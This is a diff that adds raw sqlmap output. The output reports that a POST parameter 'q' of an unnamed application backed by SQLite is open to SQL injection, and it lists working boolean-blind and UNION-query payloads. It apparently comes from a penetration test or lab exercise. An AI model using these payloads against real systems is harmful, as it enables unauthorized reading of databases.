@@ -1,0 +1,12 @@
+sqlmap identified the following injection point(s) with a total of 324 HTTP(s) requests:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: q=test' AND CASE WHEN 3635=3635 THEN 3635 ELSE JSON(CHAR(112,101,108,68)) END-- uUCU
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT NULL,CHAR(113,113,107,107,113)||CHAR(117,120,76,119,77,83,78,68,100,120,77,107,76,77,120,79,83,114,90,115,121,103,79,106,81,114,65,111,103,84,70,90,113,76,80,65,85,106,113,74)||CHAR(113,113,112,113,113)-- NKUG
+---
+back-end DBMS: SQLite
